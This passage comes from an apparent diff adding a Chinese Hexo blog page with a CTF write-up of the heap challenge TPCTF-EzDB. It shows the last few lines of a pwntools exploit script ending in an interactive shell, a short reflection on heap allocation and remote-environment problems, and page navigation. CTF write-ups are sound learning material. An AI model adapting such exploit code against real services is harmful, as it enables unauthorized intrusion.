payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四. 总结"></a>四. 总结</h2><p>​	本题完整看下来题目并不是很难，主要在逆向方面给予了很大的方便，但是在最终利用的时候有很多小的设计在里面，让我在编写exp的时候也重新复习了一下堆分配中的一些顺序，并且也掌握到了很多经验，还是比较有帮助的，希望后面可以对于这类题目有更快的解决速度，并且对于远程的exp也可以快速找到问题所在，最近很多比赛都是本地可以打通远程出现问题，大部分还是环境问题，后面感觉还是需要自己搭docker环境，和远程模拟的更加相似，防止这种情况频繁出现。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/03/05/AliyunCTF-Alimem/" rel="prev" title="AliyunCTF--Alimem">
+      <i class="fa fa-chevron-left"></i> AliyunCTF--Alimem
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TPCTF-EzDB"><span class="nav-number">1.</span> <span class="nav-text">TPCTF-EzDB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">一. 背景介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">二. 漏洞形成原因分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-add-Page"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 add Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-del-Page"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 del Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-add-Record"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 add Record</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-get-Record"><span class="nav-number">1.2.4.</span> <span class="nav-text">2.4 get Record</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-edit-Record"><span class="nav-number">1.2.5.</span> <span class="nav-text">2.5 edit Record</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">三. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 漏洞利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%AE%8C%E6%95%B4exp"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 完整exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">四. 总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">a2ure</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a2ure</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">16k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:01</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
